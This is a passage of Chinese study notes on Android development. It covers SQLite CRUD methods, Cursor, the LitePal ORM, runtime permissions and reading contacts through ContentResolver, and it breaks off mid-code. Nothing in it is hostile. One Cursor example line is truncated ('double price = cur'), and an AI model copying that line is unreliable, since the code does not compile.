<li>SQLiteDatabase 中也提供了一个非常好用的update() 方法，用于对数据进行更新，这个方法接收4个参数
<ul>
<li>第一个参数和insert() 方法一样，也是表名，在这里指定去更新哪张表里的数据。</li>
<li>第二个参数是ContentValues 对象，要把更新数据在这里组装进去。</li>
<li>第三、第四个参数用于约束更新某一行或某几行中的数据，不指定的话默认就是更新所有行。==第三参数相当于where部分，第四参数为<code>new String[]</code>为第三参数的占位符提供内容==</li>
</ul>
</li>
</ul>
<h4 id="删除数据">删除数据<a class="header-anchor" href="#删除数据"> ¶ </a></h4>
<ul>
<li>SQLiteDatabase 中提供了一个delete() 方法，专门用于删除数据，这个方法接收3个参数</li>
<li>第一个参数仍然是表名</li>
<li>第二、第三个参数又是用于约束删除某一行或某几行的数据，不指定的话默认就是删除所有行。</li>
</ul>
<h4 id="查询数据">查询数据<a class="header-anchor" href="#查询数据"> ¶ </a></h4>
<ul>
<li>SQLiteDatabase中还提供了一个query() 方法用于对数据进行查询。这个方法的参数非常复杂，最短的一个方法重载也需要传入7个参数。
<ul>
<li>第一个参数，表名，表示我们希望从哪张表中查询数据。</li>
<li>第二个参数用于指定去查询哪几列，如果不指定则默认查询所有列。</li>
<li>第三、第四个参数用于约束查询某一行或某几行的数据，不指定则默认查询所有行的数据。</li>
<li>第五个参数用于指定需要去group by的列，不指定则表示不对查询结果进行groupby操作。</li>
<li>第六个参数用于对group by之后的数据进行进一步的过滤，不指定则表示不进行过滤。</li>
<li>第七个参数用于指定查询结果的排序方式，不指定则表示使用默认的排序方式。</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">query()方法参数</th>
<th style="text-align:center">对应SQL部分</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">table</td>
<td style="text-align:center">from table_name</td>
<td style="text-align:center">指定查询的表名</td>
</tr>
<tr>
<td style="text-align:center">columns</td>
<td style="text-align:center">select column1, column2</td>
<td style="text-align:center">指定查询的列名</td>
</tr>
<tr>
<td style="text-align:center">selection</td>
<td style="text-align:center">where column = value</td>
<td style="text-align:center">指定where 的约束条件</td>
</tr>
<tr>
<td style="text-align:center">selectionArgs</td>
<td style="text-align:center"></td>
<td style="text-align:center">为where 中的占位符提供具体的值</td>
</tr>
<tr>
<td style="text-align:center">groupBy</td>
<td style="text-align:center">group by column</td>
<td style="text-align:center">指定需要group by 的列</td>
</tr>
<tr>
<td style="text-align:center">having</td>
<td style="text-align:center">having column = value</td>
<td style="text-align:center">对group by 后的结果进一步约束</td>
</tr>
<tr>
<td style="text-align:center">orderBy</td>
<td style="text-align:center">order by column1, column2</td>
<td style="text-align:center">指定查询结果的排序方式</td>
</tr>
</tbody>
</table>
<p>调用query() 方法后会返回一个Cursor 对象，查询到的所有数据都将从这个对象中取出。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查询Book表中所有的数据</span></span><br><span class="line">Cursor cursor = db.query(<span class="string">&quot;Book&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 遍历Cursor对象，取出数据并打印</span></span><br><span class="line">        String name = cursor.getString(cursor.getColumnIndex</span><br><span class="line">            (<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        String author = cursor.getString(cursor.getColumnIndex</span><br><span class="line">            (<span class="string">&quot;author&quot;</span>));</span><br><span class="line">        <span class="keyword">int</span> pages = cursor.getInt(cursor.getColumnIndex(<span class="string">&quot;pages&quot;</span>));</span><br><span class="line">        <span class="keyword">double</span> price = cur</span><br><span class="line">            (<span class="string">&quot;price&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span> (cursor.moveToNext());</span><br><span class="line">&#125;</span><br><span class="line">cursor.close();</span><br></pre></td></tr></table></figure>
<h5 id="Cursor类方法">Cursor类方法<a class="header-anchor" href="#Cursor类方法"> ¶ </a></h5>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>方法描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>getCount()</td>
<td>获得总的数据项数</td>
</tr>
<tr>
<td>isFirst()</td>
<td>判断是否第一条记录</td>
</tr>
<tr>
<td>isLast()</td>
<td>判断是否最后一条记录</td>
</tr>
<tr>
<td>moveToFirst()</td>
<td>移动到第一条记录</td>
</tr>
<tr>
<td>moveToLast()</td>
<td>移动到最后一条记录</td>
</tr>
<tr>
<td>move(int  offset)</td>
<td>移动到指定记录</td>
</tr>
<tr>
<td>moveToNext()</td>
<td>移动到下一条记录</td>
</tr>
<tr>
<td>moveToPrevious()</td>
<td>移动到上一条记录</td>
</tr>
<tr>
<td>getColumnIndexOrThrow(String columnName)</td>
<td>根据列名称获得列索引</td>
</tr>
<tr>
<td>getInt(int  columnIndex)</td>
<td>获得指定列索引的int类型值</td>
</tr>
<tr>
<td>getString(int  columnIndex)</td>
<td>获得指定列缩影的String类型值</td>
</tr>
</tbody>
</table>
<h4 id="使用SQL操作数据库">使用SQL操作数据库<a class="header-anchor" href="#使用SQL操作数据库"> ¶ </a></h4>
<ul>
<li>
<p>添加数据的方法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">db.execSQL(<span class="string">&quot;insert into Book (name, author, pages, price) values(?, ?, ?, ?)&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> String[] &#123; <span class="string">&quot;The Da Vinci Code&quot;</span>, <span class="string">&quot;Dan Brown&quot;</span>, <span class="string">&quot;454&quot;</span>, <span class="string">&quot;16.96&quot;</span> &#125;);</span><br><span class="line">db.execSQL(<span class="string">&quot;insert into Book (name, author, pages, price) values(?, ?, ?, ?)&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> String[] &#123; <span class="string">&quot;The Lost Symbol&quot;</span>, <span class="string">&quot;Dan Brown&quot;</span>, <span class="string">&quot;510&quot;</span>, <span class="string">&quot;19.95&quot;</span> &#125;);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>更新数据的方法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">db.execSQL(<span class="string">&quot;update Book set price = ? where name = ?&quot;</span>, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;10.99&quot;</span>, <span class="string">&quot;The Da Vinci Code&quot;</span> &#125;);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>删除数据的方法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">db.execSQL(<span class="string">&quot;delete from Book where pages &gt; ?&quot;</span>, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;500&quot;</span> &#125;);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查询数据的方法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">db.rawQuery(<span class="string">&quot;select * from Book&quot;</span>, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到，除了查询数据的时候调用的是SQLiteDatabase的rawQuery() 方法，其他的操作都是调用的execSQL() 方法。</p>
<h3 id="使用LitePal操作数据库">使用LitePal操作数据库<a class="header-anchor" href="#使用LitePal操作数据库"> ¶ </a></h3>
<p>LitePal是一款开源的Android数据库框架，它采用了对象关系映射（ORM）的模式，并将我们平时开发最常用到的一些数据库功能进行了封装，使得不用编写一行SQL语句就可以完成各种建表和増删改查的操作。LitePal的项目主页上也有详细的使用文档，地址是：<a href="https://github.com/guolindev/LitePal">guolindev/LitePal: An Android library that makes developers use SQLite database extremely easy. (github.com)</a>。</p>
<h4 id="配置LitePal">配置LitePal<a class="header-anchor" href="#配置LitePal"> ¶ </a></h4>
<h5 id="1-添加LitePal依赖">1. 添加LitePal依赖<a class="header-anchor" href="#1-添加LitePal依赖"> ¶ </a></h5>
<p>就是编辑<code>app/build.gradle</code>文件，在dependencies闭包中添加如下内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    <span class="function">compile <span class="title">fileTree</span><span class="params">(dir: <span class="string">&#x27;libs&#x27;</span>, include: [<span class="string">&#x27;*.jar&#x27;</span>])</span></span></span><br><span class="line"><span class="function">    compile &#x27;com.android.support:appcompat-v7:23.2.0&#x27;</span></span><br><span class="line"><span class="function">    testCompile &#x27;junit:junit:4.12&#x27;</span></span><br><span class="line"><span class="function">    compile &#x27;org.litepal.android:core:1.4.1&#x27;</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure>
<h5 id="2-配置litepal-xml文件">2. 配置litepal.xml文件<a class="header-anchor" href="#2-配置litepal-xml文件"> ¶ </a></h5>
<p>右击<code>app/src/main</code>目录→<code>New</code>→<code>Directory</code>，创建一个<code>assets</code>目录，然后在assets目录下再新建一个litepal.xml文件，接着编辑litepal.xml文件中的内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">litepal</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbname</span> <span class="attr">value</span>=<span class="string">&quot;BookStore&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">dbname</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">litepal</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>&lt;dbname&gt;</code>标签用于指定数据库名</li>
<li><code>&lt;version&gt;</code> 标签用于指定数据库版本号</li>
<li><code>&lt;list&gt;</code>标签用于指定所有的映射模型</li>
</ul>
<h5 id="3-配置LitePalApplication">3. 配置LitePalApplication<a class="header-anchor" href="#3-配置LitePalApplication"> ¶ </a></h5>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.example.litepaltest&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;org.litepal.LitePalApplication&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>将项目的<code>application</code>配置为<code>org.litepal.LitePalApplication</code>，这样才能让LitePal的所有功能都可以正常工作</p>
<h4 id="创建和升级数据库">创建和升级数据库<a class="header-anchor" href="#创建和升级数据库"> ¶ </a></h4>
<p>创建Book类，定义好相关属性（表的列名）</p>
<p>在<code>litepal.xml</code>的<code>&lt;list&gt;</code>标签内添加<code>&lt;mapping class=&quot;com.example.litepaltest.Book&quot;&gt;&lt;/mapping&gt;</code></p>
<h4 id="使用LitePal添加数据">使用LitePal添加数据<a class="header-anchor" href="#使用LitePal添加数据"> ¶ </a></h4>
<p>LitePal进行表管理操作时不需要模型类有任何的继承结构，但是进行CRUD操作时就不行了，必须要让 相关表类 继承自DataSupport 类才行，如Book表需要让Book类继承<code>DataSupport</code>类，然后调用<code>.save()</code>方法将数据存入数据库</p>
<h4 id="使用LitePal更新数据">使用LitePal更新数据<a class="header-anchor" href="#使用LitePal更新数据"> ¶ </a></h4>
<p>对于LitePal来说，对象是否已存储就是根据调用model.isSaved() 方法的结果来判断的，返回true 就表示已存储，返回false 就表示未存储。</p>
<p>方法一：对已存储的对象，重新调用<code>.save()</code>方法进行更新</p>
<p>方法二：更新从数据库中查到的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    Book book = <span class="keyword">new</span> Book();</span><br><span class="line">    book.setPrice(<span class="number">14.95</span>);</span><br><span class="line">    book.setPress(<span class="string">&quot;Anchor&quot;</span>);</span><br><span class="line">    book.updateAll(<span class="string">&quot;name = ? and author = ?&quot;</span>, <span class="string">&quot;The Lost Symbol&quot;</span>, <span class="string">&quot;Dan</span></span><br><span class="line"><span class="string">        Brown&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>**想把一个字段的值更新成默认值时，是不可以使用上面的方式来set 数据的。**将为数据更新成默认值的操作，LitePal统一提供了一个setToDefault() 方法，然后传入相应的列名就可以实现了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Book book = <span class="keyword">new</span> Book();</span><br><span class="line">book.setToDefault(<span class="string">&quot;pages&quot;</span>);</span><br><span class="line">book.updateAll();</span><br></pre></td></tr></table></figure>
<h4 id="使用LitePal删除数据">使用LitePal删除数据<a class="header-anchor" href="#使用LitePal删除数据"> ¶ </a></h4>
<ul>
<li>
<p>方法一</p>
<p>调用过save() 方法的对象，或者是通过LitePal提供的查询API查出来的对象，都是可以直接使用delete() 方法来删除数据的。</p>
</li>
<li>
<p>方法二</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DataSupport.deleteAll(Book.class, <span class="string">&quot;price &lt; ?&quot;</span>, <span class="string">&quot;15&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>这里调用了DataSupport.deleteAll() 方法来删除数据，其中deleteAll() 方法的第一个参数用于指定删除哪张表中的数据，Book.class就意味着删除Book表中的数据，后面的参数用于指定约束条件。</p>
</li>
</ul>
<h4 id="使用LitePal查询数据">使用LitePal查询数据<a class="header-anchor" href="#使用LitePal查询数据"> ¶ </a></h4>
<p>@TODO</p>
<h2 id="ContentProvider内容提供者">ContentProvider内容提供者<a class="header-anchor" href="#ContentProvider内容提供者"> ¶ </a></h2>
<p>内容提供器（Content Provider）主要用于在不同的应用程序之间实现数据共享的功能，它提供了一套完整的机制，允许一个程序访问另一个程序中的数据，同时还能保证被访数据的安全性。目前，使用内容提供器是Android实现跨程序共享数据的标准方式。</p>
<h3 id="运行时权限">运行时权限<a class="header-anchor" href="#运行时权限"> ¶ </a></h3>
<h4 id="运行时权限机制">运行时权限机制<a class="header-anchor" href="#运行时权限机制"> ¶ </a></h4>
<p>Android现在将所有的权限归成了两类，一类是普通权限，一类是危险权限。准确地讲，其实还有第三类特殊权限，不过这种权限使用得很少，因此不在本书的讨论范围之内。普通权限指的是那些不会直接威胁到用户的安全和隐私的权限，对于这部分权限申请，系统会自动帮我们进行授权，而不需要用户再去手动操作了，比如在BroadcastTest项目中申请的两个权限就是普通权限。危险权限则表示那些可能会触及用户隐私或者对设备安全性造成影响的权限，如获取设备联系人信息、定位设备的地理位置等，对于这部分权限申请，必须要由用户手动点击授权才可以，否则程序就无法使用相应的功能。</p>
<p>查看Android系统中完整的权限列表：<a href="https://developer.android.google.cn/reference/android/Manifest.permission.html">Manifest.permission  | Android Developers (google.cn)</a></p>
<h3 id="程序运行时申请权限">程序运行时申请权限<a class="header-anchor" href="#程序运行时申请权限"> ¶ </a></h3>
<h4 id="Android6-0之前">Android6.0之前<a class="header-anchor" href="#Android6-0之前"> ¶ </a></h4>
<p>Android6.0之前，不需要动态申请权限就可以使用危险权限</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_CALL);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">&quot;tel:10086&quot;</span>));</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
<p>但需要在AndroidManifest.xml中申请静态权限</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CALL_PHONE&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="Android6-0以后，动态申请权限">Android6.0以后，动态申请权限<a class="header-anchor" href="#Android6-0以后，动态申请权限"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button makeCall = (Button) findViewById(R.id.make_call);</span><br><span class="line">        makeCall.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                    permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">                    ActivityCompat.requestPermissions(MainActivity.<span class="keyword">this</span>, <span class="keyword">new</span></span><br><span class="line">                        String[]&#123; Manifest.permission.CALL_PHONE &#125;, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    call();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_CALL);</span><br><span class="line">            intent.setData(Uri.parse(<span class="string">&quot;tel:10086&quot;</span>));</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, String[] permissions,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (grantResults.length &gt; <span class="number">0</span> &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.</span><br><span class="line">                    PERMISSION_GRANTED) &#123;</span><br><span class="line">                    call();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;You denied the permission&quot;</span>, Toast.LENGTH_</span><br><span class="line">                        SHORT).show();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>先判断用户是不是已经给过授权</p>
<p>借助的是<code>ContextCompat.checkSelfPermission()</code>方法。</p>
<ul>
<li>checkSelfPermission() 方法：第一个参数是Context；第二个参数是具体的权限名</li>
<li>方法的返回值和<code>PackageManager.PERMISSION_GRANTED</code> 做比较，相等就说明用户已经授权，不等就表示用户没有授权</li>
</ul>
</li>
<li>
<p>如果已经授权，则调用相关执行逻辑</p>
</li>
<li>
<p>如果没有授权，则需要调用<code>ActivityCompat.requestPermissions()</code> 方法来向用户申请授权</p>
<ul>
<li><code>requestPermissions()</code> 方法
<ul>
<li>第一个参数要求是Activity的实例</li>
<li>第二个参数是一个String 数组，存放要申<br>
请的权限名</li>
<li>第三个参数是请求码（唯一值）这里传入了<code>1</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>最终都会回调到<code>onRequestPermissionsResult()</code> 方法中，而授权的结果则会封装在<code>rantResults</code> 参数当中。这里我们只需要判断一下最后的授权结果，如果用户同意的话就调用call() 方法来拨打电话，如果用户拒绝的话我们只能放弃操作，并且弹出一条失败提示。</p>
</li>
</ol>
<h3 id="访问其他程序中数据">访问其他程序中数据<a class="header-anchor" href="#访问其他程序中数据"> ¶ </a></h3>
<ul>
<li>内容提供器的用法：
<ul>
<li>使用现有的内容提供器来读取和操作相应程序中的数据</li>
<li>创建自己的内容提供器给我们程序的数据提供外部访问接口</li>
</ul>
</li>
</ul>
<h4 id="ContentResolver的基本用法">ContentResolver的基本用法<a class="header-anchor" href="#ContentResolver的基本用法"> ¶ </a></h4>
<p>对于每一个应用程序来说，如果想要访问内容提供器中共享的数据，就一定要借助<code>ContentResolver</code>类，可以通过<code>Context</code>中的<code>getContentResolver()</code> 方法获取到该类的实例。</p>
<p><code>ContentResolver</code>中提供了一系列的方法用于对数据进行<code>CRUD</code>操作，其中<code>insert()</code> 方法用于添加数据，<code>update()</code> 方法用于更新数据，<code>delete()</code> 方法用于删除数据，<code>query()</code> 方法用于查询数据。</p>
<ol>
<li>
<p>不同于<code>SQLiteDatabase</code>，<code>ContentResolver</code>中的增删改查方法都是不接收表名参数的，而是使用一个<code>Uri</code> 参数代替，这个参数被称为<code>内容URI</code></p>
<ul>
<li>
<p><code>内容URI</code>给内容提供器中的数据建立了唯一标识符</p>
<ul>
<li>
<p>主要由两部分组成：authority和path</p>
<ul>
<li>
<p>authority是用于对不同的应用程序做区分的，一般为了避免冲突，都会采用程序包名的方式来进行命名。比如某个程序的包名是com.example.app，那么该程序对应的authority就可以命名为com.example.app.provider。一般为<code>[PackageName].provider</code></p>
</li>
<li>
<p>path则是用于对同一应用程序中不同的表做区分的，通常都会添加到authority的后面。比如某个程序的数据库里存在两张表：table1和table2，这时就可以将path分别命名为/table1和/table2，然后把authority和path进行组合，内容URI就变成了com.example.app.provider/table1和com.example.app.provider/table2。不过，目前还很难辨认出这两个字符串就是两个内容URI，我们还需要在字符串的头部加上协议声明。</p>
</li>
<li>
<p>内容URI标准格式写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">content:<span class="comment">//com.example.app.provider/table1</span></span><br><span class="line">content:<span class="comment">//com.example.app.provider/table2</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>得到内容URI字符串之后，我们还需要将它解析成<code>Uri 对象</code>才可以作为参数传入</p>
<p>需要调用<code>Uri.parse()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Uri uri = Uri.parse(<span class="string">&quot;content://com.example.app.provider/table1&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>接下来可以使用<code>ContentResolver</code>来查询其他程序 数据库中表的数据了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Cursor cursor = getContentResolver().query(</span><br><span class="line">    uri,</span><br><span class="line">    projection,</span><br><span class="line">    selection,</span><br><span class="line">    selectionArgs,</span><br><span class="line">    sortOrder);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:center">ContentResolver.query()方法参数</th>
<th style="text-align:center">对应SQL部分</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">uri</td>
<td style="text-align:center">from table_name</td>
<td style="text-align:center">指定查询某个应用程序下的某一张表</td>
</tr>
<tr>
<td style="text-align:center">projection</td>
<td style="text-align:center">select column1, column2</td>
<td style="text-align:center">指定查询的列名</td>
</tr>
<tr>
<td style="text-align:center">selection</td>
<td style="text-align:center">where column = value</td>
<td style="text-align:center">指定where 的约束条件</td>
</tr>
<tr>
<td style="text-align:center">selectionArgs</td>
<td style="text-align:center"></td>
<td style="text-align:center">为where 中的占位符提供具体的值</td>
</tr>
<tr>
<td style="text-align:center">sortOrder</td>
<td style="text-align:center">order by column1, column2</td>
<td style="text-align:center">指定查询结果的排序方式</td>
</tr>
</tbody>
</table>
</li>
</ol>
<ul>
<li>insert(uri, contentValues);</li>
<li>update(uri, contentValues, “column1 = ? and column2 = ?”, new String[] {“text”, “1”});</li>
<li>delete(uri, “column2 = ?”, new String[] { “1” });</li>
</ul>
<h4 id="读取系统联系人">读取系统联系人<a class="header-anchor" href="#读取系统联系人"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    ArrayAdapter&lt;String&gt; adapter;</span><br><span class="line">    List&lt;String&gt; contactsList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        ListView contactsView = (ListView) findViewById(R.id.contacts_view);</span><br><span class="line">        adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(<span class="keyword">this</span>, android.R.layout. simple_list_</span><br><span class="line">            item_1, contactsList);</span><br><span class="line">        contactsView.setAdapter(adapter);</span><br><span class="line">        <span class="comment">// 判断权限</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(<span class="keyword">this</span>, Manifest.permission.READ_</span><br><span class="line">            CONTACTS) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            ActivityCompat.requestPermissions(<span class="keyword">this</span>, <span class="keyword">new</span> String[]&#123; Manifest.</span><br><span class="line">                permission.READ_CONTACTS &#125;, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            readContacts();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readContacts</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Cursor cursor = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 查询联系人数据</span></span><br><span class="line">            cursor = getContentResolver().query(ContactsContract.CommonDataKinds.</span><br><span class="line">                Phone.CONTENT_URI, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (cursor != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (cursor.moveToNext()) &#123;</span><br><span class="line">                    <span class="comment">// 获取联系人姓名</span></span><br><span class="line">                    String displayName = cursor.getString(cursor.getColumnIndex</span><br><span class="line">                       (ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));</span><br><span class="line">                    <span class="comment">// 获取联系人手机号</span></span><br><span class="line">                    String number = cursor.getString(cursor.getColumnIndex</span><br><span class="line">                       (ContactsContract.CommonDataKinds.Phone.NUMBER));</span><br><span class="line">                    contactsList.add(displayName + <span class="string">&quot;\n&quot;</span> + number);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 通知刷新adapter</span></span><br><span class="line">                adapter.notifyDataSetChanged();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cursor != <span class="keyword">null</span>) &#123;</span><br><span class="line">                cursor.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收权限申请返回结果</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, String[] permissions,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (grantResults.length &gt; <span class="number">0</span> &amp;&amp; grantResults[<span 